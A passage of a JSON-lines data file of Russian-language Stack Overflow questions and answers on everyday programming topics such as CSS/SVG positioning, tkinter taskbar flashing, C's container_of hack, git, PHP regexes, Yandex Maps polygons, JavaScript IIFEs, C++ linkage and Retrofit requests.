контекстом.\nruntime libraries - это библиотеки, которые используются во время работы программы. Иногда библиотеки поставляются в двух видах - для разработки и для обычной работы (вторые часто оптимизированы и с них выброшено лишнее). Хороший пример - bpl файлы делфи. Для одного и того же компонента могут быть библиотеки, которые содержат всякие инструметы для IDE, а есть которые только для работоспособности кода.\nJRE - это не фреймворк, это runtime библиотека. Хотя с другой стороны это фреймворк для байткода. Но так как на байткоде пищут только особые извращенцы, то обычному программисту это не фреймфорк. А вот вся java - это один сплошной фреймворк:)\n", "question_score": "9", "answer_score": 12}
{"title": "Позиционирование блока относительно фона", "description": "Есть нетривиальная задача.\n\nhtml, body, .bg-cover {\r\n  height: 100%;\r\n  margin: 0;\r\n}\r\n\r\n.bg-cover {\r\n  background-image: url(//i.stack.imgur.com/JkEWk.jpg);\r\n  background-size: cover;\r\n}\r\n\r\n.element {\r\n  position: absolute;\r\n  background: red;\r\n  background: rgba(255,0,0,.5);\r\n  height: 10.416666666666668vw;\r\n  width: 18.75vw;\r\n  background-size: cover;\r\n  z-index: 2;\r\n  left: 29.947916666666668vw;\r\n  top: 24vh;\r\n}\n<div class=\"bg-cover\">\r\n  <div class=\"element\"></div>\r\n</div>\n\nФоновое изображение:\n\nНеобходимо позиционировать element в белой области фона TV, таким образом, чтобы не нарушалось взаимное расположение фона и блока element.\nПроблема в том, что при разных разрешениях экрана фон масштабируется по разному. \nМожет как-то можно получать позицию пикселя на фоне через js и относительно этого играть?\nСталкивался кто-нибудь с подобной проблемой?\n", "answer": "Решение адаптивно,  работает во всех браузерах, включая Edge. \nЧтобы два блока с изображениями,- в вашем случае картинка комнаты и фон-изображение на TV, согласованно меняли свои пропорции и не нарушалось при этом взаимное позиционирование, необходимо разместить оба изображения внутри блока SVG \n\n<style>\r\nhtml, body, .bg-cover {\r\n  height: 100%;\r\n  margin: 0;\r\n}\r\n.element {\r\nwidth:100%; \r\nheight:100%;\r\n}\r\n\r\n</style> \n<div class=\"bg-cover\">\r\n  <div class=\"element\">\r\n  <svg viewBox=\"0 0 1776 943\">\r\n  <image xlink:href=\"http://i.stack.imgur.com/JkEWk.jpg\" width=\"100%\" height=\"100%\" />\r\n  <image xlink:href=\" https://i.stack.imgur.com/keh4g.jpg\" x=\"537\" y=\"212\" width=\"19.1%\" height=\"19.1%\" />\r\n  </svg>\r\n   </div>\r\n</div>  \n\nИнтересно сделать изображение на TV меняющееся  динамически. Идея понятна,- нужно спрятать спрайт с изображениями под картинку спальни и прокручивать спрайт, чтобы сквозь вырез экрана TV был виден спрайт.\nПробовал достаточно долго варианты с масками, с клипами, комбинированные способы, но не получилось. Отверстие в экране TV образуется, но сквозь него спрайта не видно.     \nЕсть ли у кого идеи, как сделать это?\nUpdate\nРешение  динамической смены изображений - Имитация смены изображений на экране TV\n", "question_score": "9", "answer_score": 12}
{"title": "Как сделать мигание на панели задач?", "description": "Есть программа на подобие чата. Пользователей около 5. Обмен информацией не постоянный, то есть пишут по необходимости и могут быть большие временные перерывы. Хочу сделать так, чтобы после того как кто-то написал сообщение можно было привлечь внимание других пользователей у которых запущена программа. Звук без вариантов (колонок нет). В идеале было бы мигание программы на панели. Программа будет работать на windows server 2008 r2.\nВ гугле не могу найти ничего применимого к Python (у меня 3.4).\nЭто моя первая программа.\n# -*- coding: utf-8 -*-\nimport tkinter\nfrom tkinter import *\nfrom tkinter import messagebox as mb\nimport time\n\nname = str()\nfname = str(time.strftime(\"%d_%m_%Y\"))\n\ndef messange():\n    global mdname\n    if entry.get() < '0':\n        mb.showerror('Ошибка', 'Вы не написали сообщение, сообщение не должно начинаться с пробела') # Ошибка\n    else:\n        mess = entry.get()\n        entry.delete(0, END)\n        f = open(fname + '.txt', 'a')\n        f.write(time.strftime(\"%H:%M\") + ' ' + name + ' пишет: ' + mess + '\\n')\n        f.close()\n\ndef login(event):\n    global name\n    name = entry.get()\n    if name < '0':\n        mb.showerror('Ошибка', 'Напишите ваше имя, имя не должно начинаться с пробела') # Ошибка\n    else:\n        event.widget.pack_forget() # Скрыть скнопку\n        name = entry.get()\n        entry.delete(0, END)\n        f = open(fname + '.txt', 'a')\n        f.write('Привет ' + name + '\\n')\n        f.close()\n        button_visible_false.pack() # Отобразить кнопку\n        while True:\n            f = open(fname + '.txt')\n            data = f.read()\n            time.sleep(0.3)\n            f.close()\n            textbox.delete(1.0, END)\n            textbox.insert(1.0, data)\n            textbox.see(\"end\")\n            root.update_idletasks()\n            root.update()\n\nroot = Tk()\nroot.title('Гармоничный чат v.1')\n\npanelFrame = Frame(root, height = 60, bg = 'green')\ntextFrame = Frame(root, height = 340, width = 600)\npanelFrame.pack(side = 'top', fill = 'x')\ntextFrame.pack(side = 'bottom', fill = 'both', expand = 1)\n\ntextbox = Text(textFrame, font='Arial 10', wrap='word')\nscrollbar = Scrollbar(textFrame)\n\nscrollbar['command'] = textbox.yview\ntextbox['yscrollcommand'] = scrollbar.set\n\ntextbox.pack(side = 'left', fill = 'both', expand = 1)\nscrollbar.pack(side = 'right', fill = 'y')\n\nentry = Entry(width = 80)\nentry.pack(pady = 10)\n\nbtn1 = Button(panelFrame, text='Напишите ваше имя', width=17, height=3, bg=\"white\", fg=\"black\")\nbtn1.bind('<Button-1>', login)\nbtn1.pack()\nbutton_visible_false = tkinter.Button(panelFrame, text='Написать сообщение', width=17, height=3, bg=\"white\", fg=\"black\", command = messange)\n\ntry:\n    f = open(fname + '.txt')\nexcept:\n    f = open(fname + '.txt', 'w')\nelse:\n    pass\n\nroot.mainloop()\n\n", "answer": "Для мигания можно использовать функцию FlashWindow:\nimport ctypes\nimport tkinter as tk\n\nroot = tk.Tk()\n\ndef flash_window():\n    hwnd = int(root.wm_frame(), 16)  # wm_frame() возвращает хэндл окна в виде строки в 16-ричной системе, переводим в число\n    ctypes.windll.user32.FlashWindow(hwnd, True)\n\nroot.after(1000, flash_window)\nroot.mainloop()\n\nАктивное окно мигнет один раз, свернутое подсветится (по крайней мере на Windows7 работает так).\nНе обязательно нужно делать через after, достаточно чтобы функция flash_window вызывалась откуда-то из обработчика событий, уже после запуска root.mainloop().\nЧтобы мигнуть несколько раз, можно использовать FlashWindowEx (это немного сложнее из-за того, что данные в функцию передаются через структуру FLASHINFO):\nimport ctypes\nimport tkinter as tk\n\nclass FLASHWINFO(ctypes.Structure):\n    _fields_ = [\n        (\"cbSize\", ctypes.c_uint),\n        (\"hwnd\", ctypes.c_uint),\n        (\"dwFlags\", ctypes.c_uint),\n        (\"uCount\", ctypes.c_uint),\n        (\"dwTimeout\", ctypes.c_uint)\n    ]\n\n    # Codes for dwFlags\n    FLASHW_ALL = 3  # Flash both the window caption and taskbar button. This is equivalent to setting the FLASHW_CAPTION | FLASHW_TRAY flags.\n    FLASHW_CAPTION = 1  # Flash the window caption.\n    FLASHW_STOP = 0  # Stop flashing. The system restores the window to its original state.\n    FLASHW_TIMER = 4  # Flash continuously, until the FLASHW_STOP flag is set.\n    FLASHW_TIMERNOFG = 0xC  # Flash continuously until the window comes to the foreground.\n    FLASHW_TRAY = 2  # Flash the taskbar button.\n\n    def __init__(self, hwnd, dwFlags, uCount, dwTimeout):\n        super().__init__()\n        self.cbSize = ctypes.sizeof(self)\n        self.hwnd = hwnd\n        self.dwFlags = dwFlags\n        self.uCount = uCount\n        self.dwTimeout = dwTimeout\n\nroot = tk.Tk()\n\ndef flash_window():\n    hwnd = int(root.wm_frame(), 16)\n    flashinfo = FLASHWINFO(hwnd, FLASHWINFO.FLASHW_ALL, 3, 100)\n    ctypes.windll.user32.FlashWindowEx(ctypes.byref(flashinfo))\n\nroot.after(1000, flash_window)\nroot.mainloop()\n\n", "question_score": "9", "answer_score": 10}
{"title": "Что представляет собой данное выражение в Си?", "description": "Встретил в коде данную строку:\nvoid *ptr = ((char*)l_p - (unsigned int)&((struct node_s*)0)->list);\n\nНе понимаю, что в данном контексте обозначает & и зачем в данном случае используется unsigned int. Если возможно, объясните словами, пожалуйста.\nПредставление самой структуры здесь:\nstruct node_s{\n    char a;\n    char b;\n    char c;\n    char d;\n    struct list_head list;\n};\n\n", "answer": "Перед вами классический хак, применяющийся для реализации так называемой функциональности container_of, позволяющей из указателя на поле известного struct-типа получить указатель на весь объект этого struct-типа.\nПодвыражение \n(unsigned int)&((struct node_s*)0)->list\n\nэто само по себе отдельный хак, использованный для реализации функциональности, аналогичной стандартному макро offsetof. Это подвыражение вычисляет байтовое смещение поля list в struct-типе struct node_s. На данной платформе, очевидно, подвыражение\n(struct node_s*)0\n\nпородит указатель на адрес 0x0 типа (struct node_s *), т.е. указатель на некий воображаемый объект типа struct node_s, располагающийся по адресу 0x0. Соответственно подвыражение \n((struct node_s*)0)->list\n\nбудет полем list этого воображаемого объекта. Благодаря тому, что наш воображаемый объект начинается по адресу 0x0, адрес этого поля\n&((struct node_s*)0)->list;\n\nбудет численно равен байтовому смещению поля list в этом воображаемом объекте, т.е. в типе struct node_s. Осталось только привести этот указатель к целочисленному типу\n(unsigned int)&((struct node_s*)0)->list\n\nи мы получим само смещение в байтах (при условии, что оно помещается в unsigned int; здесь существенно более уместным было бы приведение к типу uintptr_t).\nТак как в процессе этих манипуляций мы ни разу не пытаемся записывать или читать содержимое этого воображаемого объекта, а используем его лишь для вычисления адресов, никаких падений не происходит. \nТеперь, если l_p является указателем на поле list некоего реального объекта struct node_s, то арифметика \n((char*)l_p - (unsigned int)&((struct node_s*)0)->list)\n\nдаст нам указатель на сам объект struct node_s (правда пока типа char *). Вот ради этого все это и делалось.\nЕще раз, ваше исходное выражение можно более компактно переписать через стандартное макро offsetof\nvoid *ptr = (char*)l_p - offsetof(struct node_s, list);\n\nи хаков в нем станет меньше. И, как уже говорилось выше, эту функциональность обычно называют container_of. Ваше исходное выражение - это почти точный аналог\nvoid *ptr = container_of(l_p, struct node_s, list);\n\nБольшинство из произведенных в этом выражении манипуляций (особенно часть, отвечающая за аналог offsetof) являются грубо незаконными в языке С в том смысле, что порождают неопределенное поведение. Т.е., как сказано выше, это хак.\nОтдельным вопросом является то, был ли этот код написан \"руками\", или явился результатом расширения стандартного макро (того же offsetof). Для стандартных макро такие трюки позволительны (хотя современные реализации стандартной библиотеки уже отказались от их использования). Для пользовательского кода, без явной необходимости, такие трюки малоприемлемы (но иногда без них не обойтись).\n", "question_score": "9", "answer_score": 19}
{"title": "Как создать (добавить) директорию?", "description": "Первый день работаю с GIT (BitBucket).\nВозник вопрос как создать и закоммитить директорию.\nДобавил в основную папку проекта (на локале) директорию. Потом в терминале написал:\ngit add *\ngit push\n\nи в итоге ничего не изменилось. Подскажите, что я делаю не так?\n", "answer": "Чтобы git сохранил директорию:\n\nОна должна быть непустой.\nНужно добавить её содержимое и сделать коммит.\n\n1. Директория должна быть непустой\n\nДобавить пустую директорию нельзя. Команда git add «видит» только файлы и пути, в которых они лежат.\nЧтобы сохранить пустую директорию, создайте в ней пустой файл .gitkeep и добавьте его в git.\n\nПочему git так работает?\nПотому что он хранит данные в виде следующих объектов:\n\nBlob, блоб (от Binary Large OBject) — бинарный архив файла.\nTree, дерево — текстовый список содержимого директории: файлов (блобов) и других директорий (деревьев).\n\nДерево не может быть пустым — by design, так устроен алгоритм. Поэтому пустую директорию нельзя добавить. Чтобы её наполнить, достаточно создать в ней файл. Обычно такой файл называют .gitkeep, но допустимо любое имя.\nНапример, в директории есть файл и ещё пара директорий, одна из которых пуста. Вот что будет после команды git add .:\nна диске:       в индексе git:\n.               tree\n├── dir1        tree\n│   └── file1   blob\n├── dir2        (ничего)\n└── file2       blob\n\nЧтобы узнать про другие объекты и подробности, читайте Git from the bottom up.\n2. Нужно сделать коммит\nКоманда git add только добавляет файлы в индекс, после чего нужно сохранить их командой git commit.\nДля добавления используйте git add ., а не *.\n", "question_score": "9", "answer_score": 11}
{"title": "Книги и учебные ресурсы по JavaScript", "description": "Рекомендуемая литература, учебники и документация по JavaScript.\nФормат:\n\nИмя Фамилия — «Название книги целиком и полностью», ГГГГ г..\n\nФормат для переведенной литературы:\n\nИмя Фамилия (Name Surname) — «Название книги целиком и полностью», ГГГГ перевода (\"Full name of the book\", YYYY )\n\nНе создавайте новых ответов — редактируйте этот.\nСтарайтесь сохранять разделение по категориям (когда они будут).\nСохраняйте алфавитную (лексикографическую) сортировку по названию книги.\nПожалуйста, \n\nне добавляйте сюда видеолекции и интерактивные курсы, \nне размещайте ссылки на нелегальный контент вроде торрент-трекеров.\n\nДанный перечень входит в поддерживаемый сообществом Сборник учебных ресурсов по программированию.\n\n", "answer": "JavaScript\n\nDouglas Crockford — «JavaScript: The Good Parts», 2008\n(Не рекомендуется новичкам в JS)\n\nMarijn Haverbeke — «Eloquent JavaScript: A Modern Introduction to Programming», 2014\n\nAddy Osmani — «Learning JavaScript Design Patterns», 2012\n(Не рекомендуется новичкам в программировании)\n\nСтоян Стефанов — «JavaScript. Шаблоны», 2011\n\nДэвид Флэнаган — «JavaScript. Подробное руководство», 2012\n(Допустим для новичков в программировании, но ориентирован не на них)\n\nДэвид Херман — «Сила JavaScript. 68 способов эффективного использования JS», 2013\n\nЭрик Фримен, Элизабет Робсон — «Изучаем программирование на JavaScript», 2015\n(Подойдет для начинающих)\n\nДжон Резиг, Беэр Бибо — «Секреты JavaScript ниндзя», 2015\n(Подойдет для более продвинутых)\n\nИлья Кантор — «Современный учебник Javascript» \n(В основном ориентирован на работу online, но есть и pdf/epub версия. Достаточно дружелюбен для новичков)\n\nMozilla Developer Network — раздел о JavaScript\n(Хороший онлайн справочник по языку, но есть и учебник)\n\nMetanit.com - Web разработка / JavaScript (Такой же хороший онлайн справочник, что и Mozilla Developer Network)\n\nCпецификация (формальное описание синтаксиса, базовых объектов и алгоритмов) языка Javascript - называется ECMAScript.\n\nНиколас Закас - JavaScript для профессиональных веб-разработчиков (3-е изд.) - 2015. 960 стр. Несмотря на название - для новичков самое-то. Шикарная книга.\n\nНиколас Закас - ECMAScript 6 для разработчиков - 2017. Книга расскажет о всех изменениях в JS, внесенных ECMAScript 6. (не для\nновичков).\n\nМэтт Фрисби - JavaScript для профессиональных веб-разработчиков, 2022\n\njQuery\n\nБер Бибо, Иегуда Кац — «jQuery. Подробное руководство по продвинутому JavaScript», 2011\n\n", "question_score": "85", "answer_score": 74}
{"title": "Убрать все символы, кроме латиницы, кириллицы и запятой - PHP", "description": "подскажите регулярку, которая должна вырезать любые символы, кроме запятой (оставаться должны только кириллица и латинница). Сделал наброски , вроде работают , но запятую не знаю как оставить.\n$key_words=mb_strtolower($key_words);\n$key_words=preg_replace(\"/[^a-zа-я\\s]/iu\",\"\",$key_words);\n\n", "answer": "Если должны остаться только буквы (кириллица + латиница) и запятая, то код должен иметь вид:\npreg_replace(\"/[^а-яёa-z,]/iu\", '', $target);\n\nUPD:\nСтоит обратить внимание, что регулярное выражение выше соответствует только части кириллицы, а именно русскому алфавиту. Вообще, понятие кириллица существенно шире, и включает символы, используемые не только в современном русском алфавите, но и в ряде других славянских языков. Кириллические Unicode символы можно увидеть, например, здесь.\nТоже самое, касается и латиницы. Формально, помимо символов английского алфавита (/[a-z]/i), туда входит еще множество других символов, например, ñ из испанского алфавита. Регулярное выражение выше, соответствует только символам английского алфавита, а не всем символам латиницы.\nUPD2:\nЕсли же вы действительно хотите оставить в строке символы, которые формально входят в латиницу или кириллицу, то вы можете использовать следующий код:\npreg_replace(\"/[^,\\p{Cyrillic}\\p{Latin}]/ui\", '', $target);\n\nЭто регулярное выражение оставляет очень большой набор символов (например, кириллические символы ѥѧѭ). Не думаю, что его вообще стоит использовать, но для тех, кто формально относится к понятиям латиница и кириллица, оно может оказаться интересным.\n", "question_score": "8", "answer_score": 15}
{"title": "Как на яндекс карте показать районы города?", "description": "Есть задача показать административные районы города на яндекс картах. \nПри этом каждый район должен иметь свой цвет и прозрачность.\nНапример, здесь отображается один район города:\nна Яндекс Карте\nНужно показать все( или несколько) районы(ов) города и иметь возможность задать им цвет и прозрачность через API.\nПодскажите, как это можно сделать?\nUPD1. Есть идея сделать районы в виде полигонов. Тогда можно будет править их как угодно. Но нужны координаты границ районов. Карта яндекса откуда же берет эти данные. Вот как их получить?  \nUPD2. Получен официальный ответ от тех поддержки Яндекс Карт.\n\"Средствами АПИ Яндекс карт сделать это нельзя\". Так что испольуем OSM.\n", "answer": "Общий план действий такой:\nymaps.ready(function() {\n// 0. Создаем карту, например так:\n    var map,\n        regionName = \"Краснодар, Западный округ\",\n        center = [38.943216, 45.033266],\n        zoom = 11;\n\n    map = new ymaps.Map('yamap', {\n        center: center,\n        zoom: zoom,\n        controls: []\n    });\n// 1. Запрашиваем через геокодер район (у Яндекса этой возможности пока нет, придется пользоваться OSM)\n    var url = \"http://nominatim.openstreetmap.org/search\";\n    $.getJSON(url, {q: regionName, format: \"json\", polygon_geojson: 1})\n        .then(function (data) {\n            $.each(data, function(ix, place) {\n                if (\"relation\" == place.osm_type) {\n// 2. Создаем полигон с нужными координатами\n                    var p = new ymaps.Polygon(place.geojson.coordinates);\n// 3. Добавляем полигон на карту\n                    map.geoObjects.add(p);\n                }\n            });\n        }, function (err) {\n            console.log(err);\n        });\n});\n\nЭтап 1, в качестве примера, приведен с использованием jQuery.\nЭтап 2 скрывает небольшую проблему. OSM возвращает координаты в порядке (долгота, широта), Яндекс работает по-умолчанию с порядком (широта, долгота). Чтобы это поменять нужно указать порядок при подключении API\n<script src=\"https://api-maps.yandex.ru/2.1/?lang=ru_RU&coordorder=longlat\" type=\"text/javascript\"></script>\n\nТакже на этапе 2 можно добавить \"по вкусу\" цвет фона, обводку, прозрачность и многое другое см. Polygon\n", "question_score": "8", "answer_score": 15}
{"title": "Самовыполняющиеся функции", "description": "Зачем оборачивать блоки кода на JS в самовыполняющиеся функции?\n", "answer": "Переменные, объявленные внутри функции, являются локальными (находятся в её области видимости). Это даёт как минимум 3 полезных момента:\n\n\"Снаружи\" не \"достучаться\" до того, что объявлено внутри функции.\nНе получится случайно затереть глобальную переменную, объявив переменную с таким же именем внутри функции.\nГлобальная область видимости не \"захламляется\" данными, которые не должны быть глобальными.\n\nСамовыполняющаяся функция (Immediately-Invoked Function Expression, IIFE) позволяет воспользоваться этими преимуществами, не создавая глобальную функцию.\n\nvar x = 1;\r\n(function() {\r\n    var x = 2;\r\n    var y = 3;\r\n    console.log(\"In: \" + x); //In: 2\r\n    console.log(\"In: \" + y); //In: 3\r\n})();\r\nconsole.log(\"Out: \" + x); //Out: 1\r\nconsole.log(\"Out: \" + y); //ReferenceError: y is not defined \n\nНапример, можно использовать самовыполняющуюся функции для того, чтобы сохранять данные, необходимые для работы функции, и которые при этом нужно хранить между вызовами функции:\n\nvar test = (function() {\r\n    var count = 0;\r\n    return function() {\r\n        count++;\r\n        console.log(\"Count: \" + count);\r\n    };\r\n})();\r\ntest(); //Count: 1\r\ntest(); //Count: 2\r\nconsole.log(count); //ReferenceError: count is not defined\n\nПеременная count недоступна в глобальной области видимости, однако доступна внутри возвращаемой функции, так как та объявлена внутри самовыполняющейся функции, и поэтому имеет доступ к её области видимости.\n\nТакже самовыполняющаяся функция может \"помочь\" с сохранением промежуточных значений данных при асинхронном выполнении кода.\nНапример:\n\nfor (var i = 0; i < 10; i++) {\r\n    setTimeout(function() {\r\n        console.log(i);\r\n    }, 1000 * i);\r\n}\n\nДанный код будет выводить в консоль раз в секунду не числа по возрастанию, а число 10, потому что на момент вызова первой функции в setTimeout глобальная переменная i уже будет равна 10 (сначала проходят все итерации цикла, а уже потом вызывается первая функция).\nЕсли же обернуть setTimeout в функцию и передавать ей i в качестве аргумента, то вывод будет от 0 до 9:\n\nfor (var i = 0; i < 10; i++) {\r\n    (function(i) {\r\n        setTimeout(function() {\r\n            console.log(i);\r\n        }, 1000 * i);\r\n    })(i);\r\n}\n\nВ данном случае переменная i в setTimeout уже не является глобальной переменной и не зависит от её изменений. Однако тут не нужно забывать о том, что если переменная является объектом, то изменение значения поля объекта \"снаружи\" приведёт и к изменению значения поля объекта \"внутри\".\n", "question_score": "8", "answer_score": 15}
{"title": "Зачем в .NET типы данных разделили на ссылочные и значимые?", "description": "Зачем в .NET типы данных разделили на ссылочные и значимые? \n", "answer": "Различие между ссылочными типами и типами-значениями на самом деле семантическое. Оно не в том, выделяется ли память в куче или нет (язык имеет право любой из объектов располагать в любой памяти, и делает это: например, типы-значения, попавшие в замыкание, будут «подняты» до кучи).\nРазличие состоит в семантике равенства и копирования.\nДавайте посмотрим на пример. Вот у вас есть число 5. Это число — одно и то же, вне зависимости от того, как вы его получили. Если вы увеличите 5 на 1, вы не измените при этом само число 5, вы просто получите новое число. Когда вы копируете число в другую переменную, эта новая переменная живёт своей жизнью, не зависящей от старого числа.\nТеперь, пусть у вас есть объект, допустим, СписокПокупок. Этот объект ведёт себя совсем по-другому. Если вы создадите новый СписокПокупок, он будет отличаться от уже существующего: вы можете добавить товар в новый список, а в старом он при этом не появится. С другой стороны, когда вы копируете ссылку на список покупок в другую переменную, то вы продолжаете при это работать с тем же списком.\nИными словами: у объектов типа списка покупок есть индивидуальность. А у объектов типа числа такой индивидуальности нет, они ничем не отличаются друг от друга.\nТак вот: объекты, которые ведут себя как число, и называются объектами-значениями. А объекты с индивидуальностью называются ссылочными объектами. \nВсе остальные технические подробности служат лишь для реализации этой самой различной семантики. Например, объекты-значения чаще всего располагаются в стеке потому, что их можно расположить там: ведь у них никому не интересен конкретный экземпляр, поэтому за пределы метода можно выдать копию. А значит, оригинал можно держать на стеке (так эффективнее).\nДополнительная литература: Eric Lippert. The Stack Is An Implementation Detail: Part 1, Part 2.\n", "question_score": "8", "answer_score": 12}
{"title": "Что такое внутреннее и внешнее связывание?", "description": "Что такое внутреннее и внешнее связывание в языке C++ ?\n", "answer": "Стандарт C++:\n\nWhen a name has external linkage , the entity it denotes can be\n  referred to by names from scopes of other translation units or from\n  other scopes of the same translation unit\n\nи\n\nWhen a name has internal linkage , the entity it denotes can be\n  referred to by names from other scopes in the same translation unit.\n\nПо-русски это можно перевести как: внешнее связывание имеют те сущности, к которым можно обратиться в единице трансляции, отличной от той, где они определены. \nНапример, имея в заголовке header.h:\nextern int object;\n\nв first.cpp\nint object;\n...\nobject = 5;\n\nв second.cpp\n#include \"header.h\"\n...\nobject = 3;\n\nТак вот, int object; в first.cpp имеет внешнее связывание, т.е. на него могут ссылаться другие единицы трансляции, что и делает second.cpp. Но чтобы second.cpp узнал, что такая переменная вообще существует, мы ему сказали через extern int object;. Таким образом получается, что несколько единиц трансляции обращаются к одному и тому же объекту в памяти. Это и есть внешнее связывание.\nВнутренее связывание отличается от внешнего тем, что к сущности имеющей внутренее связывание нельзя обратиться из единицы трансляции, отличной от той, где она определена. \nТак, если взять тот же пример, но изменить first.cpp на \nstatic int object;\n\nили на \nnamespace\n{\n    int object;\n}\n\nи не трогать другой код то при линковке second.cpp мы получим ошибку линковщика, говорящую, что он не может найти object. Это происходит потому, что object имеет внутреннее связывание и, как я уже сказал, это значит, что другие единицы трансляции не могут видеть это имя.\n\nДля лучшего понимания, можно воспользоваться следующей аналогией: у классов, в C++, есть несколько уровней доступа, в числе которых есть private и public. Компилятор проверяет, чтобы только внутренние части класса(опустим friend'ов и хаки) обращались к private членам, и любое обращение к таковым извне класса вызовет ошибку компиляции. С другой стороны, public члены доступны всем вокруг,— к ним может обращаться любая внешняя сущность. \nТак вот, внутреннее и внешнее связывание ведут себя как private и public у классов, только ошибки тут выявляются на этапе линковки, а не компиляции. Другими словами, это ещё можно сказать так: сущности с внешним связыванием экспортируется за пределы единицы трансляции, тогда как с внутренним связыванием — нет, о них внешний мир вообще не знает.\n", "question_score": "8", "answer_score": 13}
{"title": "Post запрос используя retrofit", "description": "Нужно создать POST запрос с отправкой логина,пароля и получением токена, мне порекомендовали retrofit, так как стандартными способами это не получается сделать. Но я не понимаю как в нем создается запрос (документацию смотрел), к примеру\npublic interface API { \n   @POST(\"/v1/registration\") \n   Response registerUser(); \n}\n\nНо я не понимаю как минимум , где ссылка на сайт и где задаются параметры запроса. Тут я вижу запрос на регистрацию пользователя, но где все данные? он берет их из метода? \nUPD:\n   public interface API {\n    @POST(\"/v1/registration\")\n    Response registerUser(@Body RegistrationBody registrationBody);\n    Call<RegistrationResponse> registerUser();\n}\npublic class RegistrationBody{\n    public String login;\n    public String password;\n}\npublic class RegistrationResponse {\n    public String token;\n}\nRetrofit retrofit = new Retrofit.Builder()\n        .baseUrl(\"https://myserver1.com\")\n        .build();\nAPI api = retrofit.create(API.class);\n@POST(\"/v1/registration\")\nCall<RegistrationResponse> registerUser(@Body RegistrationBody registrationBody) {\n    return null;\n}\nCall<RegistrationResponse> call = api.registerUser();\ncall.enqueue(new Callback<RegistrationResponse() {\n    @Override\n    public void onResponse(Response<RegistrationResponse> response) {\n        if (response.isSuccess()) {\n            // tasks available\n        } else {\n            // error response, no access to resource?\n        }\n    }    \n\nесть ошибки начиная с call.enqueue\n", "answer": "Например у нас есть сервер с POST методом регистрации - https://myserver1.com/v1/registration\nНапример данный метод принимает Json вида:\n{\n  \"logins\": \"ttt\",\n  \"password\": \"123\"\n}\n\nи возвращает ответ вида\n{\n    \"token\":\"someToken\"\n}\n\nТогда в проекте надо определить интерфейс, описывающий данный метод сервера таким образом\npublic interface API { \n   @POST(\"/v1/registration\") \n   RegistrationResponse registerUser(@Body RegistrationBody registrationBody); \n}\n\nГде RegistrationBody и RegistrationResponse это классы со следующими полями:\npublic class RegistrationBody{\n    public String login;\n    public String password;\n}\n\npublic class RegistrationResponse {\n    public String token;\n}\n\nДалее для обращения к серверу сначала необходимо создать объект Retrofit куда необходимо передать имя сервера и любую другую дополнительную информацию.\nRetrofit retrofit = Retrofit.Builder()\n                .baseUrl(\"https://myserver1.com\")\n                .build();\n\nПосле, из этого объекта можно получить реализацию интерфейса с методами\nAPI api = retrofit.create(API.class);\n\nНу и далее у объекта api вызывать нужные методы. Только помните, что нельзя лезть в интернет в основном потоке. Что бы вынести обращение к серверу в отдельный поток можно воспользоваться средствами, которые предоставляет Retrofit. Для этого надо в интерфейсе возвращаемый параметр обернуть в тип Call\n@POST(\"/v1/registration\") \nCall<RegistrationResponse> registerUser(@Body RegistrationBody registrationBody); \n\nи потом вызвать\nCall<RegistrationResponse> call = api.registerUser(...);\ncall.enqueue(new Callback<RegistrationResponse() {  \n    @Override\n    public void onResponse(Response<RegistrationResponse> response) {\n        if (response.isSuccess()) {\n            // tasks available\n        } else {\n            // error response, no access to resource?\n        }\n    }\n\n    @Override\n    public void onFailure(Throwable t) {\n    }\n}\n\nUPD:\nВ метод api.registerUser(...) необходимо передать объект RegistrationBody предварительно заполнив его данными:\nRegistrationBody body = new RegistrationBody();\nbody.login = \"myLogin\";\nbody.password = \"12345\";\n\napi.registerUser(body);\n\nСериализация происходит с использованием библиотеки GSON, как правильно сериализовать объект, читайте в официальной документации.\nДля работы в асинхронном режиме просто в интерфейсе API создайте метод, который будет возвращать Call<T> вместо T\n", "question_score": "8", "answer_score": 25}
{"title": "Шаблонная виртуальная функция", "description": "Поясните, пожалуйста, почему нельзя создать виртуальную шаблонную функцию?\nНашел следующее объяснение:\n\nMember function templates cannot be declared virtual. This constraint\n  is imposed because the usual implementation of the virtual function\n  call mechanism uses a fixed-size table with one entry per virtual\n  function. However, the number of instantiations of a member function\n  template is not fixed until the entire program has been translated.\n  Hence, supporting virtual member function templates would require\n  support for a whole new kind of mechanism in C++ compilers and\n  linkers. In contrast, the ordinary members of class templates can be\n  virtual because their number is fixed when a class is instantiated\n\nТо есть теоретически такой функционал реализовать можно, но это потребует серьезного изменения принципов работы существующих компилятор и линковщиков. Или есть и другие причины?\n", "answer": "Простой ответ:\nВ С++ шаблон функции не является функцией, поэтому шаблон не может быть виртуальным.\nВ C#/Java/etc используются не шаблоны, а generics. Generic-функция это (одна) функция, поэтому там такой проблемы нет.\nСложный ответ:\nВ С++ виртуальные функции сделаны так, что их количество прописано в определении базового класса.\nЭто позволяет присвоить функции некоторый индекс в базовом классе и быстро находить ее по этому индексу.  \nstruct Base {            \n  func_t* vft;  // скрытый член класса - массив виртуальных функций\n  virtual void f();   \n};                    \n\nBase* x = new Derived;         \nx->f();\n// компилируется в\nx->vft[0]();\n\nЕсли шаблоны будут виртуальными, то вместо перечисления функций в базовом классе надо искать все подстановки шаблона при вызовах функции.\nДля этого вместо индексов надо использовать имена, и искать эти имена в хеш-таблице.\nstruct Base {            \n  hash_map<string, func_t> vft;  // скрытый член класса - хеш-таблица виртуальных функций\n  template<typename T> virtual void f();   \n};                    \n\nBase* x = new Derived;         \nx->f<int>();\n// компилируется в\nx->vft[\"f<int>\"]();\n\nСкорость вызова значительно упадет, т.к. надо будет разрешать коллизии. \nМожно использовать идеальную хеш-функцию (без коллизий).\nstruct Base {            \n  func_t* vft;  // скрытый член класса - массив (sic!) виртуальных функций\n  virtual void f();   \n};                    \n\nBase* x = new Derived;         \nx->f();\n// компилируется в\nx->vft[ideal_hash(\"f<int>\")]();\n// ideal_hash(name) выдает индекс массива, без коллизий\n\nНо из-за динамической линковки (.so/.dll) весь исходный код программы недоступен, и при каждой загрузке SO/DLL надо останавливать всю программу, менять хеш-функцию и перестраивать все таблицы, чтобы учитывались типы, которые добавились в этой SO/DLL.\n\nИспользование JIT-компилятора может заменять виртуальные вызовы на обычные, и тогда никаких проблем с производительностью вызова не будет.\n// вместо x->f(); генерируется\nx->Derived::f();\n// если доказано что тут может быть только Derived\n\nНо девиртуализация работает только если количество классов мало, и на данный момент эффективных JIT-компиляторов нет. (Те что есть, например в LLVM, не показывают хороших результатов.)\n", "question_score": "8", "answer_score": 10}
